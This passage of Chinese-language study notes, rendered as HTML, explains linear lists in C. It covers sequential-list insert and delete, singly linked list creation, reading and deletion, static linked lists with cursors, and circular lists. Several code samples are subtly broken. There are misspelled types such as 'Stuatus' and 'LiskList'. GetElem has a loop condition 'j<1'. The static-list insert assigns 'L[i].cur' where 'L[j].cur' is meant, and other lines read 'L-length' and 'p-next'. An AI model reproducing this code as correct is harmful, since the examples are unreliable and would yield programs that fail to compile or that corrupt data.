&#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;=L-length)        <span class="comment">//3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(k=L-&gt;length<span class="number">-1</span>;k&gt;=i<span class="number">-1</span>;k--)</span><br><span class="line">        &#123;</span><br><span class="line">            L-&gt;data[k+<span class="number">1</span>]=L-&gt;data[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;data[i<span class="number">-1</span>]=e;    <span class="comment">//4</span></span><br><span class="line">    L-&gt;length++;    <span class="comment">//5</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除算法思路：</span></span><br><span class="line"><span class="comment">    1.异常检测判断：删除位置不合理，抛出异常</span></span><br><span class="line"><span class="comment">    2.取出/记录删除元素</span></span><br><span class="line"><span class="comment">    3.循环覆盖实现删除：从删除元素位置开始遍历到最后一个元素位置，分别向前移动一位</span></span><br><span class="line"><span class="comment">    4.length-1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListDelete</span><span class="params">(SqList *L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">    <span class="keyword">if</span>(L-&gt;length==<span class="number">0</span>)    <span class="comment">//空表</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;L-&gt;length)    <span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    *e=L-&gt;data[i<span class="number">-1</span>];    <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">if</span>(i&lt;L-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(k=i;k&lt;L-&gt;length;k++)</span><br><span class="line">        &#123;</span><br><span class="line">            L-&gt;data[k<span class="number">-1</span>]=L-&gt;data[k];    <span class="comment">//3</span></span><br><span class="line">        &#125;</span><br><span class="line">        L-&gt;length--;    <span class="comment">//4</span></span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>读取时间复杂度：O(1)</li>
+<li>插入、删除时间复杂度：【平均】O(n)【最坏】O(n)【最好】O(1)</li>
+<li>顺序存储优势：<ul>
+<li>方便存、取</li>
+</ul>
+</li>
+<li>顺序存储劣势：<ul>
+<li>不方便增、删</li>
+<li>难以确定存储空间容量</li>
+<li>造成存储空间碎片</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ol start="4">
+<li><h3 id="线性表的链式存储结构"><a href="#线性表的链式存储结构" class="headerlink" title="线性表的链式存储结构"></a>线性表的<span style="color: purple;">链式存储结构</span></h3><ol>
+<li><h4 id="链式存储结构的定义：n个结点链结成一个链表"><a href="#链式存储结构的定义：n个结点链结成一个链表" class="headerlink" title="链式存储结构的定义：n个结点链结成一个链表"></a>链式存储结构的定义：n个结点链结成一个链表</h4><ol>
+<li>数据域：存储数据元素信息（data）的域</li>
+<li>指针域：<strong>存储直接后继</strong>（next）位置的域<ol>
+<li>指针&#x2F;链：指针域中存储的信息</li>
+<li>最后一节结点的指针域：NULL &#x2F; ^</li>
+</ol>
+</li>
+<li>结点：数据域+指针域&#x3D;数据元素a<sub>i</sub></li>
+<li><span style="color: green;">单链表：每个结点只包含一个指针域</span></li>
+<li>头指针：<span style="color: red;">（必要元素）</span>指向链表中第一个结点的存储位置</li>
+<li>头结点：<span style="color: red;">（非必要元素，为了方便操作）</span>人为设置，置于第一个结点前<span style="color: green;">【数据域：不存储任何信息&#x2F;存储如线表长度等附加信息】【指针域：指向第一个结点的指针】</span></li>
+</ol>
+</li>
+<li><h4 id="链式存储结构-建立单链表"><a href="#链式存储结构-建立单链表" class="headerlink" title="链式存储结构-建立单链表"></a>链式存储结构-建立单链表</h4><ol>
+<li><p>（数据域）存放数据元素：a<sub>i</sub>&#x3D;p-&gt;data，a<sub>i+1</sub>&#x3D;p-&gt;next-&gt;data</p>
+</li>
+<li><p>（指针域）存放一个指针：p-&gt;next</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;    <span class="comment">//数据域</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span>    <span class="comment">//指针域（后继）</span></span><br><span class="line">&#125;Node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">LinkList</span>;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><h4 id="单链表的读取：“工作指针后移”遍历查找（GetElem）"><a href="#单链表的读取：“工作指针后移”遍历查找（GetElem）" class="headerlink" title="单链表的读取：“工作指针后移”遍历查找（GetElem）"></a>单链表的读取：“工作指针后移”遍历查找（GetElem）</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">遍历思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p指向链表第一个结点，初始化计数器j=1</span></span><br><span class="line"><span class="comment">    2.当j&lt;i时，遍历链表，p的指针向后移动，j++</span></span><br><span class="line"><span class="comment">    3.若链表末尾p为空，第i个结点不存在</span></span><br><span class="line"><span class="comment">    4.否则查找成功，返回数据p-&gt;data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Stuatus <span class="title function_">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    LinkLisk p;</span><br><span class="line">    p=L-&gt;next;    <span class="comment">//1</span></span><br><span class="line">    j=<span class="number">1</span>;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p=p-&gt;next;    <span class="comment">//2</span></span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j&gt;i)    <span class="comment">//3.（不为非空）!p!=0 --&gt; p==0</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    *e=p-&gt;data;    <span class="comment">//4.取出数据p-&gt;data</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><h4 id="单链表的插入、删除：O-n-【插删操作越频繁，效率优势越明显】"><a href="#单链表的插入、删除：O-n-【插删操作越频繁，效率优势越明显】" class="headerlink" title="单链表的插入、删除：O(n)【插删操作越频繁，效率优势越明显】"></a>单链表的插入、删除：O(n)【插删操作越频繁，效率优势越明显】</h4><ol>
+<li><p>插入：覆盖指针域<span style="color: red;">（先右后左）</span> <code>s-&gt;next = p-&gt;next;</code> <code>p-&gt;next = s;</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">插入算法思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p指向链头，初始化计数器j=1</span></span><br><span class="line"><span class="comment">    2.异常判断，指针p循环遍历到第i位，j++</span></span><br><span class="line"><span class="comment">    3.若链表末尾p为空，说明第i个结点不存在</span></span><br><span class="line"><span class="comment">    4.否则查找成功，动态扩容生成一个空节点s</span></span><br><span class="line"><span class="comment">    5.**数据元素e赋值给s-&gt;data**</span></span><br><span class="line"><span class="comment">    6.**覆盖插入指针域**</span></span><br><span class="line"><span class="comment">    7.return OK;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListInsert</span><span class="params">(LinkList *L,<span class="type">int</span> i,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    LinkList p,s;</span><br><span class="line">    p = *L;    <span class="comment">//1.指向链头</span></span><br><span class="line">    j = <span class="number">1</span>;    <span class="comment">//1.计数器</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;i)    <span class="comment">//2</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p || j&gt;i)    <span class="comment">//3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    s=(LiskList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));    <span class="comment">//4.malloc()</span></span><br><span class="line">    s-&gt;data = e;    <span class="comment">//5</span></span><br><span class="line">    s-&gt;next = p-&gt;next;    <span class="comment">//6</span></span><br><span class="line">    p-&gt;next = s;    <span class="comment">//6</span></span><br><span class="line">    <span class="keyword">return</span> OK;    <span class="comment">//7</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除：<span style="color: red;">后继的后继结点</span>覆盖<span style="color: red;">后继节点</span> <code>q = p-&gt;next;</code> <code>p-next = q-&gt;next; //p-&gt;next-&gt;next;</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除算法思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p指向表头，初始化计数器j=1</span></span><br><span class="line"><span class="comment">    2.j&lt;i，p指针循环遍历链表到i-1，j++</span></span><br><span class="line"><span class="comment">    3.异常检测：若链表末尾p为空，说明i结点不存在</span></span><br><span class="line"><span class="comment">    4.**否则查找成功，取出后继节点p-&gt;next赋值给q**</span></span><br><span class="line"><span class="comment">    5.**后继的后继q-next结点覆盖后继节点p-&gt;next**</span></span><br><span class="line"><span class="comment">    6.q结点中数据赋值给返回值e</span></span><br><span class="line"><span class="comment">    7.释放q结点【free();】</span></span><br><span class="line"><span class="comment">    8.return OK;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListDelete</span><span class="params">(LinkList *L,<span class="type">int</span> i,ElemType *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    LinkList p,q;</span><br><span class="line">    p = *L;    <span class="comment">//1</span></span><br><span class="line">    j = <span class="number">1</span>;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; j&lt;i)    <span class="comment">//2.p指针循环遍历移动到第i-1个元素</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        ++j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!(p-&gt;next) || j&gt;i)    <span class="comment">//3.异常检测</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    q = p-&gt;next;    <span class="comment">//4</span></span><br><span class="line">    p-&gt;next = q-&gt;next;    <span class="comment">//5</span></span><br><span class="line">    *e = q-&gt;data;    <span class="comment">//6</span></span><br><span class="line">    <span class="built_in">free</span>(q);    <span class="comment">//7</span></span><br><span class="line">    <span class="keyword">return</span> OK;    <span class="comment">//8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><h4 id="单链表的整表创建：动态生成链表的过程"><a href="#单链表的整表创建：动态生成链表的过程" class="headerlink" title="单链表的整表创建：动态生成链表的过程"></a>单链表的整表创建：动态生成链表的过程</h4><ol>
+<li><p><span style="color: red;">头插法</span>创建：（在头结点后面）<strong>循环插入，向后延伸</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">头插法创建思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p和计数器j</span></span><br><span class="line"><span class="comment">    （初始化随机数发生器）</span></span><br><span class="line"><span class="comment">    2.创建一个只有头结点的单链表，L头结点指针指向NULL</span></span><br><span class="line"><span class="comment">    3.循环生成结点，接在头结点后面延伸</span></span><br><span class="line"><span class="comment">        a.生成新结点赋值给p</span></span><br><span class="line"><span class="comment">        b.随机生成数据赋值给 p的数据域-&gt;data</span></span><br><span class="line"><span class="comment">        c.单链表插入结点操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreatListHead</span><span class="params">(LinkList *L,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList p;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    *L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    (*L)-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        p=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        p-&gt;data=rand()%<span class="number">100</span>+<span class="number">1</span>;    <span class="comment">//1~100，rand()%100:0~99</span></span><br><span class="line">        p-&gt;next=(*L)-&gt;next;</span><br><span class="line">        (*L)-&gt;next=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><span style="color: red;">尾插法</span>创建：<strong>先来后到，延长尾巴</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">尾插法创建思路：</span></span><br><span class="line"><span class="comment">    1.声明指针p，和指向表尾的指针r</span></span><br><span class="line"><span class="comment">    （初始化随机数发生器）</span></span><br><span class="line"><span class="comment">    2生成一个（暂时作为）尾结点</span></span><br><span class="line"><span class="comment">    3.循环生成结点，替代前一个尾结点作为新的尾结点</span></span><br><span class="line"><span class="comment">        a.生成新尾结点赋值给p，生成随机数赋值给数据域p-&gt;data</span></span><br><span class="line"><span class="comment">        b.p指针指向结点赋值给r-&gt;next：接在r后面</span></span><br><span class="line"><span class="comment">        c.p赋值给r，r指针更新尾结点</span></span><br><span class="line"><span class="comment">    4.生成结点结束，最终确定尾结点，指针域r-&gt;next赋空</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreatListTail</span><span class="params">(LinkList *L,<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList p,r;    <span class="comment">//1</span></span><br><span class="line">    <span class="type">int</span> i;    </span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    *L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));    </span><br><span class="line">    r=*L;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;n ; i++)    <span class="comment">//3</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));    <span class="comment">//3.a</span></span><br><span class="line">        p-&gt;data=rand()%<span class="number">100</span>+<span class="number">1</span>;    <span class="comment">//3.a</span></span><br><span class="line">        r-&gt;next=p;    <span class="comment">//3.b</span></span><br><span class="line">        r=p;    <span class="comment">//3.c</span></span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next=<span class="literal">NULL</span>;    <span class="comment">//4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><h4 id="单链表的整表删除"><a href="#单链表的整表删除" class="headerlink" title="单链表的整表删除"></a>单链表的整表删除</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">删除算法思路：</span></span><br><span class="line"><span class="comment">    1.【皇帝-&gt;太子】声明指针p负责释放结点，【遗嘱】指针q负责索引下一个待释放的结点</span></span><br><span class="line"><span class="comment">    2.从第一个结点开始（头结点-&gt;next==第一个结点，赋值给p）</span></span><br><span class="line"><span class="comment">    3.循环释放操作</span></span><br><span class="line"><span class="comment">        a.先将下一个结点p-&gt;next赋值给索引指针q</span></span><br><span class="line"><span class="comment">        b.释放p结点【free()】</span></span><br><span class="line"><span class="comment">        c.q赋值给p，继续下一个循环释放</span></span><br><span class="line"><span class="comment">    4.只剩下头结点，循环释放结束</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ClearList</span><span class="params">(LinkList *L)</span></span><br><span class="line">&#123;</span><br><span class="line">    LinkList p,q;    <span class="comment">//1</span></span><br><span class="line">    p=(*L)-&gt;next;    <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span>(p)    <span class="comment">//3.循环释放</span></span><br><span class="line">    &#123;</span><br><span class="line">        q=p-&gt;next;    <span class="comment">//3.a</span></span><br><span class="line">        <span class="built_in">free</span>(p);    <span class="comment">//3.b</span></span><br><span class="line">        p=q;    <span class="comment">//3.c</span></span><br><span class="line">    &#125;</span><br><span class="line">    (*L)-&gt;next=<span class="literal">NULL</span>;    <span class="comment">//4</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><h4 id="静态链表【游标实现法】"><a href="#静态链表【游标实现法】" class="headerlink" title="静态链表【游标实现法】"></a>静态链表【游标实现法】</h4><ol>
+<li><p><span style="color: red;">建立数组</span>描述的单链表： 每一个下标对应data（存放数据元素）、cur（存放后继的游标 &#x3D;&#x3D; next）</p>
+<ol>
+<li>备用链表：未被使用的空闲空间</li>
+<li>特殊元素：头&amp;尾<ol>
+<li>【≈索引指针】<strong>数组第一个元素</strong>cur存放备用链表第一个结点的下标</li>
+<li>【≈头结点】<strong>数组最后一个元素</strong>cur存放第一个数值元素的下标（空链表：cur &#x3D;&#x3D; 0）</li>
+</ol>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*创建静态链表*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 1000    <span class="comment">//定义容量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="type">int</span> cur;</span><br><span class="line">&#125;Component,StaticLinkList[MAXSIZE];</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>**<span style="color: red;">初始化</span>**数组状态：生成一个空链</p>
+<ol>
+<li>第i结点指针域（i-&gt;next）：space[i].cur</li>
+<li>头指针：space[0].cur</li>
+<li>空指针：“0”</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Status <span class="title function_">InitList</span><span class="params">(StaticLinkList space)</span>    <span class="comment">//int InitList()&#123;&#125;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;MAXSIZE<span class="number">-1</span>;i++)    <span class="comment">//下标i == n-1</span></span><br><span class="line">    &#123;</span><br><span class="line">        space[i].cur = i+<span class="number">1</span>;    <span class="comment">//第i个元素的cur指向i+1 (i-&gt;next = i+1;)</span></span><br><span class="line">    &#125;</span><br><span class="line">    space[MAXSIZE<span class="number">-1</span>].cur = <span class="number">0</span>;    <span class="comment">//空链：头结点的next为空</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>实现<strong>Malloc函数</strong>动态扩容：<span style="color: red;">查找当前</span>第一个新<span style="color: red;">待插入空节点</span>：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">扩容：查找当前备用链表第一个空变量：</span></span><br><span class="line"><span class="comment">    1.初始第一个空闲节点（第一个内存空间的cur）赋值给i</span></span><br><span class="line"><span class="comment">    2.循环遍历：当第一个结点的cur不为空</span></span><br><span class="line"><span class="comment">        a.下一个结点作为新的第一个空闲节点，实现扩容+1</span></span><br><span class="line"><span class="comment">    3.返回i</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">Malloc_SSL</span><span class="params">(StaticLinkList space)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = space[<span class="number">0</span>].cur;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(space[<span class="number">0</span>].cur)    <span class="comment">//2</span></span><br><span class="line">    &#123;</span><br><span class="line">        space[<span class="number">0</span>].cur = space[i].cur;    <span class="comment">//2.a</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;    <span class="comment">//3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><span style="color: red;">插入</span>操作：<strong>只</strong>需<strong>改变数组两个cur</strong>值（偷天换日）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">k：查找原i的cur</span></span><br><span class="line"><span class="comment">i：待插入到的位数</span></span><br><span class="line"><span class="comment">j：新产生的数据下标</span></span><br><span class="line"><span class="comment">插入：交换cur</span></span><br><span class="line"><span class="comment">    1.声明记录变量j、k、l，k从最大容量最后一位下标开始计算</span></span><br><span class="line"><span class="comment">    2.异常检测</span></span><br><span class="line"><span class="comment">    3.新节点下标赋值给j</span></span><br><span class="line"><span class="comment">    4.判断j是否为空（空间剩余）</span></span><br><span class="line"><span class="comment">        (1)e赋值数据域</span></span><br><span class="line"><span class="comment">        (2)循环遍历到第i个元素（遍历到原i-1位置）</span></span><br><span class="line"><span class="comment">            a.L[k].cur指向原i结点（即k为i-1结点位置）</span></span><br><span class="line"><span class="comment">        (3)改变cur实现插入1：新元素cur（L[j].cur）指向原i结点（L[k].cur）</span></span><br><span class="line"><span class="comment">        (4)改变cur实现插入2：原i-1结点的cur（L[k].cur）指向新节点（j）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListInsert</span><span class="params">(StaticLinkList L,<span class="type">int</span> i,ElemType e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k,l;</span><br><span class="line">    k=MAXSIZE - <span class="number">1</span>;    <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span> || i &gt; ListLength(L) + <span class="number">1</span>)    <span class="comment">//2</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    j=Malloc_SSL(L);    <span class="comment">//3</span></span><br><span class="line">    <span class="keyword">if</span>(j)    <span class="comment">//4</span></span><br><span class="line">    &#123;</span><br><span class="line">        L[j].data = e;    <span class="comment">//4(1)</span></span><br><span class="line">        <span class="keyword">for</span>(l = <span class="number">1</span>;l &lt;= i<span class="number">-1</span>;l++)    <span class="comment">//4(2)</span></span><br><span class="line">        &#123;</span><br><span class="line">            k = L[k].cur;    <span class="comment">//4(2).a</span></span><br><span class="line">        &#125;</span><br><span class="line">        L[i].cur=L[k].cur;    <span class="comment">//4（3）</span></span><br><span class="line">        L[k].cur=j;    <span class="comment">//4（4）</span></span><br><span class="line">        <span class="keyword">return</span> OK;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>实现<strong>free内存释放</strong>函数：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">已删除结点成为新的第一空闲结点（space[0].cur）</span></span><br><span class="line"><span class="comment">    1.已删除结点的cur指向原第一空闲结点</span></span><br><span class="line"><span class="comment">    2.k结点成为新的第一空闲元素，原space[0].cur成为第二空闲元素</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Free_SSL</span><span class="params">(StaticLinkList space,<span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">    space[k].cur = space[<span class="number">0</span>].cur;    <span class="comment">//1</span></span><br><span class="line">    space[<span class="number">0</span>].cur = k;    <span class="comment">//2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><span style="color: red;">删除</span>操作：确定需要释放的元素i，调用Free_SSL函数进行释放</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">确定需要释放的元素i：</span></span><br><span class="line"><span class="comment">    1.异常判断</span></span><br><span class="line"><span class="comment">    2.k从最大容量最后一位下标开始计算</span></span><br><span class="line"><span class="comment">    3.循环遍历到i-1位置</span></span><br><span class="line"><span class="comment">    4.将第i位结点赋值给j（L[j].cur）</span></span><br><span class="line"><span class="comment">    5.j的下一个结点作为新的第一个（有数据）结点</span></span><br><span class="line"><span class="comment">    6.调用赋值函数Free_SSL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">Status <span class="title function_">ListDelete</span><span class="params">(StaticLinkList L,<span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,k;</span><br><span class="line">    <span class="keyword">if</span>(i&lt;<span class="number">1</span> || i&gt;ListLength(L))    <span class="comment">//1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    k=MAXSIZE<span class="number">-1</span>;    <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">for</span>(j = <span class="number">1</span>;j &lt;= i<span class="number">-1</span>;j++)    </span><br><span class="line">    &#123;</span><br><span class="line">        k= L[k].cur;    <span class="comment">//3</span></span><br><span class="line">    &#125;</span><br><span class="line">    j = L[k].cur;    <span class="comment">//4</span></span><br><span class="line">    L[k].cur = L[j].cur;    <span class="comment">//5</span></span><br><span class="line">    Free_SSL(L,j);    <span class="comment">//6.传递k=j</span></span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>遍历<span style="color: red;">检测静态链表长度</span>：返回<strong>数据元素个数</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ListLength</span><span class="params">(StaticLinkList L)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i=L[MAXSIZE<span class="number">-1</span>].cur;    <span class="comment">//最后元素的cur存放第一个（有数据）结点位置</span></span><br><span class="line">    <span class="keyword">while</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        i=L[i].cur;    <span class="comment">//循环往后遍历，直到i为空</span></span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><h4 id="循环链表：单链表尾接上头构成一个环"><a href="#循环链表：单链表尾接上头构成一个环" class="headerlink" title="循环链表：单链表尾接上头构成一个环"></a>循环链表：单链表尾接上头构成一个环</h4><ol>
+<li><p><strong>空</strong>循环<strong>链</strong>：头指针head-&gt;next指向头指针head</p>
+</li>
+<li><p>（非空）循环链：<span style="color: green;">p-&gt;next !&#x3D; head</span>，则未到尾结点【头O(1)；<span style="color: blue;">尾O(n)</span>】</p>
+</li>
+<li><p>改造循环链：增加一个尾指针<span style="color: red;">rear</span>，第一个结点为<span style="color: red;">rear-&gt;next-&gt;next</span>【头O(1)；<span style="color: blue;">尾O(1)</span>】</p>
+</li>
+<li><p>链接两个带头结点的循环链表：都有头结点，只保留一个</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = rearA-&gt;next;</span><br><span class="line">rearA-&gt;next = rearB-&gt;next-&gt;next;</span><br><span class="line">q = rearB-&gt;next;</span><br><span class="line">rearB-&gt;next = p;</span><br><span class="line"><span class="built_in">free</span>(q);    <span class="comment">//释放B的头结点，只保留A头</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li><h4 id="双向链表：增加一个直接前驱指针prior的单链表"><a href="#双向链表：增加一个直接前驱指针prior的单链表" class="headerlink" title="双向链表：增加一个直接前驱指针prior的单链表"></a>双向链表：增加一个<span style="color: red;">直接前驱指针prior</span>的单链表</h4><ol>
+<li><p>双向链表存储结构：</p>
